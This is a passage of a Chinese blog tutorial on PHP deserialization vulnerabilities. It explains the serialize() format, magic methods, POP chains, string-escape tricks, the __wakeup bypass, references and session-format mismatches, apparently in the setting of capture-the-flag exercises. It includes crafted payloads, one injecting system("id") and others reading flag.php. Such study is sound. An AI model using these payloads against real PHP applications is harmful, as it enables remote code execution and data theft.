class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">hero</span></span>&#123;<br><span class="hljs-keyword">var</span> <span class="hljs-variable">$name</span>;<br><span class="hljs-keyword">var</span> <span class="hljs-variable">$sex</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">jineng</span>(<span class="hljs-params"><span class="hljs-variable">$var1</span></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;name;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$var1</span>;<br>&#125;<br>&#125;<br><span class="hljs-variable">$cyj</span>= <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">hero</span>()<span class="hljs-comment">//实例化类hero()为对象cyj</span><br><span class="hljs-variable">$cyj</span>-&gt;name=<span class="hljs-string">&#x27;chengyaojin&#x27;</span>;   <span class="hljs-comment">//参数赋值</span><br><span class="hljs-variable">$cyj</span>-&gt;sex=<span class="hljs-string">&#x27;man&#x27;</span>;            <br><span class="hljs-variable">$cyj</span>-&gt;<span class="hljs-title function_ invoke__">jineng</span>(<span class="hljs-string">&#x27;zuofan&#x27;</span>);     <span class="hljs-comment">//调用函数 </span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$cyj</span>);              <span class="hljs-comment">//打印对象cyj</span><br></code></pre></td></tr></table></figure><h2 id="类的修饰符"><a href="#类的修饰符" class="headerlink" title="类的修饰符"></a>类的修饰符</h2><p>在类中直接声明的变量称为成员属性（也可以成为成员变量）。</p><p>可以在类中声明多个变量，即”对象”中可以有多个成员属性，每个变量都存储”对象”不同的属性信息</p><p><strong>访问权限修饰符：对属性的定义</strong></p><p><strong>常用的访问权限修饰符：</strong></p><ul><li><code>pubilc</code>：公共的，在类的内容、子类中或者类的外部都可以使用，不受限制;</li><li><code>protected</code>：受保护的，在类的内部、子类中可以使用，但不能再类的外部使用;</li><li><code>private</code>：私有的，只能在类的内部使用，在类的外部或者子类中都无法使用</li></ul><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1.png"></p><h2 id="类的成员方法"><a href="#类的成员方法" class="headerlink" title="类的成员方法"></a>类的成员方法</h2><p>在类中定义的函数被称为成员方法</p><p>函数实现的是某个独立的功能;</p><p>成员方法实现的是类中的一个行为，是类的一部分</p><p>可以在类中声明多个成员方法，成员方法的声明和函数声明完全一样，只不过在声明成员方法时可以在function关键字前加一些访问权限修饰符，如public、protected、private（可以省略，默认为public）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Students</span></span>&#123;<br><span class="hljs-keyword">var</span> <span class="hljs-variable">$name</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$sex</span><br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$school</span>;<br><span class="hljs-keyword">protected</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Read</span>(<span class="hljs-params"></span>)</span>&#123;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Listen</span>(<span class="hljs-params"></span>)</span>&#123;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h1><p>序列化是将对象的状态信息（属性）转换为可以存储或传输的形式的过程。</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-2.png"></p><p>将对象或者数组转化为可储存&#x2F;传输的字符串。</p><p>在php中使用函数serialize()来将对象或者数组进行序列化，并返回一个包含字节流的字符串来表示</p><p>表达方式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>所有格式第一位都是数据类型的英文字母简写。</p><p><strong>注意：后面一定要加<code>;</code>这才是序列化完整的表达方式</strong></p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-3.png"></p><h2 id="数组序列化"><a href="#数组序列化" class="headerlink" title="数组序列化"></a>数组序列化</h2><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-4.png"></p><p>a对应array即数组，3对应数组内参数的数量</p><p>i:0对应编号第0位即”benben”，s对应string字符串，6对应有6个字符，”benben”即内容</p><h2 id="对象序列化"><a href="#对象序列化" class="headerlink" title="对象序列化"></a>对象序列化</h2><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-5.png"></p><p>序列化后的内容：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;pub&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;benben&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>注意：</p><ul><li>不能序列化类，可以序列化对象</li><li>只序列化成员变量，不序列化成员函数</li></ul><hr><p><strong>private私有属性序列化时，在变量名前加”%00类名%00”</strong></p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-6.png"></p><p><strong>%00是url编码，ascii编码为空，二进制的00</strong></p><p><strong>一般在输出序列化格式时要先转换成url编码</strong></p><p>echo urlencode(serialize($a));</p><p>序列化后的内容：</p><p>00隔开，’pub’时’test’的私有属性</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;0testpub0&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;benben&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><hr><p><em><em>protected受保护属性序列化时，在变量名前加%00</em>%00</em>*</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-7.png"></p><hr><p><strong>对象调用另一个对象的序列化</strong></p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-8.png"></p><p><strong>test2类在实例化时，将其中成员属性$ben又被赋值成了test实例化后的对象</strong></p><p><strong>序列化的对象中包含一个序列化的对象</strong></p><p>下面的操作和上面序列化后输出的结果相同</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-9.png"></p><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><ol><li><strong>反序列化之后的内容为一个对象</strong></li><li><strong>反序列化生成的对象里的值，由反序列化里的值提供；与原有类预定义的值无关</strong></li><li><strong>反序列化不触发类的成员方法；需要调用方法才能触发</strong></li></ol><h2 id="反序列化的作用"><a href="#反序列化的作用" class="headerlink" title="反序列化的作用"></a>反序列化的作用</h2><p>将序列化后的参数还原成实例化的对象</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-10.png"></p><p><strong>注意：反序列化后的对象是不存在成员方法的，需要调用类的方法才能触发</strong></p><h2 id="反序列化漏洞利用"><a href="#反序列化漏洞利用" class="headerlink" title="反序列化漏洞利用"></a>反序列化漏洞利用</h2><p><strong>反序列化漏洞的成因：反序列化过程中，unserialize（）接收的值（字符串）可控的，通过更改这个值（字符串），得到所需要的代码，即生成的对象的属性值。</strong></p><p><strong>通过调用方法，触发代码执行</strong></p><p>实例：</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-11.png"></p><p><strong>手动构造序列化字符串：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;system(&quot;</span>id<span class="hljs-string">&quot;);&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><h1 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h1><h3 id="常用知识"><a href="#常用知识" class="headerlink" title="常用知识"></a>常用知识</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">private变量会被序列化为：<span class="hljs-string">/x00</span>类名<span class="hljs-string">/x00</span>变量名<br>protected变量会被序列化为: <span class="hljs-string">/x00/</span>*<span class="hljs-string">/x00</span>变量名 <br>public变量会被序列化为：变量名<br>在PHP中，类不区分大小写<br><br>__sleep<span class="hljs-params">()</span>    <span class="hljs-string">//</span>在对象被序列化之前运行  *<br><br>__wakeup<span class="hljs-params">()</span>   <span class="hljs-string">//</span>将在反序列化之后立即调用  *<br>如果类中同时定义了 __unserialize<span class="hljs-params">()</span> 和 __wakeup<span class="hljs-params">()</span> 两个魔术方法， 则只有 __unserialize<span class="hljs-params">()</span> 方法会生效，__wakeup<span class="hljs-params">()</span> 方法会被忽略。此特性自 PHP 7.4.0 起可用。<br>__construct<span class="hljs-params">()</span> <span class="hljs-string">//</span>当对象被创建时，会触发进行初始化<br>__destruct<span class="hljs-params">()</span> <span class="hljs-string">//</span>对象被销毁时触发<br>__toString<span class="hljs-params">()</span>： <span class="hljs-string">//</span>当一个对象被当作字符串使用时触发<br>__call<span class="hljs-params">()</span> <span class="hljs-string">//</span>在对象上下文中调用不可访问的方法时触发<br>__callStatic<span class="hljs-params">()</span> <span class="hljs-string">//</span>在静态上下文中调用不可访问的方法时触发<br>__get<span class="hljs-params">()</span> <span class="hljs-string">//</span>获得一个类的成员变量时调用,用于从不可访问的属性读取数据（不可访问的属性包括：1.属性是私有型。2.类中不存在的成员变量）<br>__<span class="hljs-keyword">set</span><span class="hljs-params">()</span> <span class="hljs-string">//</span>用于将数据写入不可访问的属性<br>__isset<span class="hljs-params">()</span> <span class="hljs-string">//</span>在不可访问的属性上调用isset<span class="hljs-params">()</span>或empty<span class="hljs-params">()</span>触发<br>__<span class="hljs-keyword">unset</span><span class="hljs-params">()</span> <span class="hljs-string">//</span>在不可访问的属性上使用<span class="hljs-keyword">unset</span><span class="hljs-params">()</span>时触发<br>__toString<span class="hljs-params">()</span> <span class="hljs-string">//</span>把类当作字符串使用时触发<br>__invoke<span class="hljs-params">()</span> <span class="hljs-string">//</span>当尝试以调用函数的方式调用一个对象时<br><br></code></pre></td></tr></table></figure><hr><p><strong>魔术方法：</strong></p><p><strong>一个预定义好的，在特定情况下自动触发的行为方法。</strong></p><p><strong>作用：</strong></p><p><strong>魔术方法在特定条件下自动调用相关方法，最终导致触发代码</strong></p><p><strong>魔术方法相关机制（即魔术方法学习的重要四点）</strong></p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-12.png"></p><p><strong>需要掌握的一些魔术方法：</strong></p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-13.png"></p><h2 id="construct和-destruct"><a href="#construct和-destruct" class="headerlink" title="__construct和__destruct()"></a>__construct和__destruct()</h2><p><strong>__construct()</strong></p><p>构造函数，在实例化一个对象时，首先回去自动执行的一个方法</p><p><strong>触发时机：在实例化对象时</strong></p><p><strong>功能：提前清理不必要的内容</strong></p><hr><p><strong>__destruct()</strong></p><p>析构函数，在对象的所有引用被删除或者当对象被显式销毁时执行的魔术方法，在方法调用时会触发一次，在反序列化时会触发一次</p><p><strong>触发时机:对象引用完成或对象被销毁</strong></p><p><strong>注意：</strong></p><ol><li><strong>实例化对象结束后，代码运行完会销毁，触发析构函数</strong></li><li><strong>在序列化过程中不会触发</strong></li><li><strong>在反序列化过程中会触发；反序列化得到的是对象，用完后会销毁，触发析构函数__destruct()</strong></li></ol><h2 id="sleep-和-wakeup"><a href="#sleep-和-wakeup" class="headerlink" title="__sleep()和__wakeup()"></a>__sleep()和__wakeup()</h2><p><strong>__sleep()</strong></p><p>序列化serialize()函数会检查类中是否存在一个魔术方法**__sleep()。**</p><p><strong>如果存在，该方法会先被调用，然后才执行序列化操作。</strong></p><p>此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。</p><p>如果该方法未返回任何内容，则NULL被序列化，并产生一个E_NOTICE级别的错误</p><p><strong>触发时机：序列化serialize()之前</strong></p><p><strong>功能：对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性</strong></p><p><strong>参数：成员属性</strong></p><p><strong>返回值：需要被序列化存储的成员属性</strong></p><p>实例：</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-14.png"></p><hr><p><strong>__wakeup</strong></p><p>unserialize()会检查是否存在一个__wakeup()方法。</p><p>如果存在，则会先调用__wakeup()方法，预先准备对象需要的资源。</p><p>预先准备对象资源，返回void，常用与反序列化操作中重新建立数据库连接或执行其他初始化操作。</p><p><strong>触发时机：反序列化unserialize()之前</strong></p><p>对比：</p><p>__wakeup()在反序列化unserialize()之前</p><p>__destruct()在反序列化之后</p><p>实例：</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-15.png"></p><h2 id="toString-和-invoke"><a href="#toString-和-invoke" class="headerlink" title="__toString()和__invoke()"></a>__toString()和__invoke()</h2><p>__toString()</p><p>表达方式错误导致魔术方法触发</p><p><strong>触发时机：把对象当成字符串调用</strong></p><p>常用与构造POP链</p><p>实例：</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-16.png"></p><p>把类User实体化并赋值给$test,此时$test是个对象，调用对象可以使用print_r或者var_dump。</p><p>如果使用ehco或者print只能调用字符串的方式去调用对象，即把对象当成字符串使用，此时自动触发toString()</p><hr><p><strong>__invoke()</strong></p><p>格式表达错误导致魔术方法触发</p><p><strong>触发时机：把对象当成函数调用</strong></p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-17.png"></p><h2 id="错误调用相关魔术方法"><a href="#错误调用相关魔术方法" class="headerlink" title="错误调用相关魔术方法"></a>错误调用相关魔术方法</h2><h3 id="call"><a href="#call" class="headerlink" title="__call()"></a>__call()</h3><p><strong>触发时机：调用一个不存在的方法</strong></p><p>参数：2个参数传参$arg1，$arg2</p><p>返回值：调用的不存在的方法的名称和参数</p><p>实例：</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-18.png"></p><p>$arg2是数组类型的变量，我们调用的传参即为$arg2[0]</p><hr><h3 id="callStatic"><a href="#callStatic" class="headerlink" title="__callStatic()"></a>__callStatic()</h3><p><strong>触发时机：静态调用或调用成员变量时使用的方法不存在</strong></p><p>参数：2个参数传参$arg1,$arg2</p><p>返回值：调用的不存在的方法的名称和参数</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-19.png"></p><p>静态调用：其实就是把-&gt;换成::</p><hr><h3 id="get"><a href="#get" class="headerlink" title="__get()"></a>__get()</h3><p><strong>触发时机：调用的成员属性不存在</strong></p><p>参数：传参$arg1</p><p>返回值：不存在的成员属性的名称</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-20.png"></p><hr><h3 id="set"><a href="#set" class="headerlink" title="__set()"></a>__set()</h3><p><strong>触发时机：给不存在的成员属性赋值</strong></p><p>参数：传参$arg1,$arg2</p><p>返回值：不存在的成员属性的名称和赋的值</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-22.png"></p><hr><h3 id="isset"><a href="#isset" class="headerlink" title="__isset()"></a>__isset()</h3><p><strong>触发时机：对不可访问或不存在的属性使用isset()或empty()时，__isset()会被调用</strong></p><p>参数：传参$arg1</p><p>返回值：不存在或不可访问的成员属性的名称</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-23.png"></p><hr><h3 id="unset"><a href="#unset" class="headerlink" title="__unset()"></a>__unset()</h3><p><strong>触发时机：对不可访问属性使用unset()时</strong></p><p>参数：传参$arg1</p><p>返回值：不存在的成员属性的名称</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-24.png"></p><hr><h3 id="clone"><a href="#clone" class="headerlink" title="__clone()"></a>__clone()</h3><p>触发时机：当使用clone关键字拷贝完成一个对象后，新对象会自动调用定义的魔术方法__clone()</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-25.png"></p><h2 id="魔术方法总结"><a href="#魔术方法总结" class="headerlink" title="魔术方法总结"></a>魔术方法总结</h2><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-26.png"></p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-27.png"></p><h1 id="pop链"><a href="#pop链" class="headerlink" title="pop链"></a>pop链</h1><p>在反序列化中，我们能控制的数据就是对象中的属性值（成员变量），所以在PHP反序列化中有一种漏洞利用方法叫“面向属性编程”，即POP</p><p><strong>pop链就是利用魔术方法在里面进行多次跳转然后获取敏感数据的一种payload</strong></p><h2 id="POC编写"><a href="#POC编写" class="headerlink" title="POC编写"></a>POC编写</h2><p>POC (全称: Proof of concept) 中文译作概念验证在安全界可以理解成漏洞验证程序。Poc 是一段不完整的程序，仅仅是为了证明提出者的观点的一段代码</p><p>编写一段不完整的程序，获取所需要的序列化字符串</p><p>反推法：从得到flag开始反推过程，推完后再正推构造pop链</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-28.png"></p><h1 id="字符串逃逸基础"><a href="#字符串逃逸基础" class="headerlink" title="字符串逃逸基础"></a>字符串逃逸基础</h1><p><strong>反序列化分隔符</strong></p><p>在前面的字符串没有问题的情况下，;}是反序列化结束符，后面的字符串不影响正常的反序列化</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-29.png"></p><p><strong>特性：</strong></p><ol><li>成员属性数量一致</li><li>成员名称长度一致</li><li>内容长度一致</li><li>类中如果有我们构造的序列化字符串中没有的成员属性，会根据类自动补全</li></ol><p><strong>属性逃逸</strong></p><p>一般在数据先经过一次serialize再经过unserialize，在这个中阿金反序列化的字符串变多或者变少的时候才有可能存在反序列化属性逃逸。</p><h2 id="字符串减少逃逸"><a href="#字符串减少逃逸" class="headerlink" title="字符串减少逃逸"></a>字符串减少逃逸</h2><p>反序列化字符串减少逃逸：多逃逸出一个成员属性</p><p><strong>第一个字符串减少，吃掉有效代码，在第二个字符串构造代码</strong></p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-30.png"></p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-31.png"></p><h2 id="字符串增多逃逸"><a href="#字符串增多逃逸" class="headerlink" title="字符串增多逃逸"></a>字符串增多逃逸</h2><p>反序列化字符串增多逃逸：构造出一个逃逸成员属性</p><p><strong>第一个字符串增多，吐出多余代码，把多余位代码构造成逃逸的成员属性</strong></p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-32.png"></p><p>构造思路：</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-33.png"></p><h1 id="字符串逃逸例题"><a href="#字符串逃逸例题" class="headerlink" title="字符串逃逸例题"></a>字符串逃逸例题</h1><h2 id="字符串增多逃逸例题"><a href="#字符串增多逃逸例题" class="headerlink" title="字符串增多逃逸例题"></a>字符串增多逃逸例题</h2><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-34.png"></p><p>思路：</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-35.png"></p><p>就是先构造我们要逃逸出来的字符串，然后计算字符串的长度，长度即为字符串增多的次数</p><p>比如：这里字符串有29个字符长度</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">&quot;;s:<span class="hljs-number">4</span><span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;escaping&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p><strong>所以构造29个’php’</strong></p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-36.png"></p><p>payload:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">?param<span class="hljs-punctuation">=</span>phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp<span class="hljs-string">&quot;;s:4:&quot;</span>pass<span class="hljs-string">&quot;;s:8:&quot;</span>escaping<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="字符串减少逃逸例题"><a href="#字符串减少逃逸例题" class="headerlink" title="字符串减少逃逸例题"></a>字符串减少逃逸例题</h2><p><strong>题目：</strong></p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-37.png"></p><p><strong>构造思路：</strong></p><p><strong>‘’建议吃掉，$pass的值benben可控</strong></p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-38.png"></p><p>我们每次构造的时候都可以用<code>&quot;;</code>开头，这样如果多的话直接在前面补1即可</p><p><strong>payload构造：</strong></p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-39.png"></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?u</span>ser=flagflagflagflagflagflagflagflagflagflag&amp;pass=<span class="hljs-number">1</span><span class="hljs-string">&quot;;s:4:&quot;</span>pass<span class="hljs-string">&quot;;s:6:&quot;</span>benben<span class="hljs-string">&quot;;s:3:&quot;</span>vip<span class="hljs-string">&quot;;b:1;&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">解析：</span><br><span class="hljs-string">pass=1&quot;</span>;xxxx这里加了个<span class="hljs-number">1</span>因为要多吃一个，我们前面生成的<span class="hljs-string">&quot;;s:4&quot;</span>pass<span class="hljs-string">&quot;;s:xx:&quot;</span>只有<span class="hljs-number">19</span>位，加个<span class="hljs-number">1</span>刚好<span class="hljs-number">20</span>位，而这里的<span class="hljs-string">&quot;;可以理解为闭合，因为前面的双引号也被吃了</span><br></code></pre></td></tr></table></figure><h1 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="wakeup绕过"></a>wakeup绕过</h1><p><strong>漏洞产生的原因：如果存在wakeup方法，调用unserialize()前则先调用weakup方法，但是序列化字符串中表示对象属性个数的值大于真实的属性个数时，会跳过__weakup()执行。</strong></p><p><strong>有版本限制</strong></p><p>例题：</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-40.png"></p><p>绕过思路：</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-41.png"></p><p>payload:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gcode">O:<span class="hljs-number">+6</span>:<span class="hljs-string">&quot;secret&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;file&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>;&#125;<br>需要先url编码<br><br>?cmd=O<span class="hljs-meta">%</span><span class="hljs-number">3</span>A<span class="hljs-meta">%</span><span class="hljs-number">2</span>B<span class="hljs-number">6</span><span class="hljs-meta">%</span><span class="hljs-number">3</span>A<span class="hljs-meta">%</span><span class="hljs-number">22</span>secret<span class="hljs-meta">%</span><span class="hljs-number">22</span><span class="hljs-meta">%</span><span class="hljs-number">3</span>A<span class="hljs-number">2</span><span class="hljs-meta">%</span><span class="hljs-number">3</span>A<span class="hljs-meta">%</span><span class="hljs-number">7</span>Bs<span class="hljs-meta">%</span><span class="hljs-number">3</span>A<span class="hljs-number">4</span><span class="hljs-meta">%</span><span class="hljs-number">3</span>A<span class="hljs-meta">%</span><span class="hljs-number">22</span>file<span class="hljs-meta">%</span><span class="hljs-number">22</span><span class="hljs-meta">%</span><span class="hljs-number">3</span>Bs<span class="hljs-meta">%</span><span class="hljs-number">3</span>A<span class="hljs-number">8</span><span class="hljs-meta">%</span><span class="hljs-number">3</span>A<span class="hljs-meta">%</span><span class="hljs-number">22</span>flag.php<span class="hljs-meta">%</span><span class="hljs-number">22</span><span class="hljs-meta">%</span><span class="hljs-number">3</span>B<span class="hljs-meta">%</span><span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure><h1 id="引用的利用方式"><a href="#引用的利用方式" class="headerlink" title="引用的利用方式"></a>引用的利用方式</h1><p><strong>&amp;符号的利用</strong></p><p>感觉有点像c里的取地址符，指针</p><p>比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$a</span> = new <span class="hljs-built_in">test</span>();<br><span class="hljs-variable">$a</span>-&gt;enter = &amp;<span class="hljs-variable">$a</span>-&gt;secret;<br></code></pre></td></tr></table></figure><p>这里就相当于a对象中的成员属性enter的值引用了a对象中成员属性secret的值，所以当secret的值改变的时候，enter依然与enter相同</p><p>例题：</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-42.png"></p><p>payload构造：</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-43.png"></p><h1 id="session反序列化漏洞"><a href="#session反序列化漏洞" class="headerlink" title="session反序列化漏洞"></a>session反序列化漏洞</h1><p><strong>session</strong></p><p>当session_start()被调用或者php.ini中session.auto_start为1时，PHP内部调用会话管理器，访问用户session被序列化以后，存储到指定目录（默认为&#x2F;tmp）。</p><p>存取数据的格式有多种，常用的有三种</p><p>漏洞产生：写入格式和读取格式不一致</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-44.png"></p><p>当网站序列化并存储session，与反序列化并读取session的方式不同，就可能导致session反序列化漏洞的产生</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-45.png"></p><h2 id="session反序列化漏洞例题"><a href="#session反序列化漏洞例题" class="headerlink" title="session反序列化漏洞例题"></a>session反序列化漏洞例题</h2><p>题目：</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-46.png"></p><p>这题思路就是我们要触发__wakeup魔术方法才能得到flag，但是页面没有反序列化来触发，所以可以利用hint.php文件<br>因为hint.php声明的session存储格式为php_serialize，而题目使用的是默认的php格式，所以默认页面以php格式处理session读取时就会触发漏洞</p><p>构造思路：</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-47.png"></p><h1 id="phar反序列化漏洞"><a href="#phar反序列化漏洞" class="headerlink" title="phar反序列化漏洞"></a>phar反序列化漏洞</h1><h2 id="什么是phar"><a href="#什么是phar" class="headerlink" title="什么是phar"></a>什么是phar</h2><p>JAR是开发java程序一个引用，包括所有的可执行、可访问的文件，都打包进了一个JAR文件里，使得部署过程十分简单</p><p><code>**like a java JAR,but for PHP**</code></p><p><strong>PHAR（”Php ARchive”）是PHP里类似于JAR的一种打包文件。</strong></p><p><strong>对于PHP 5.3 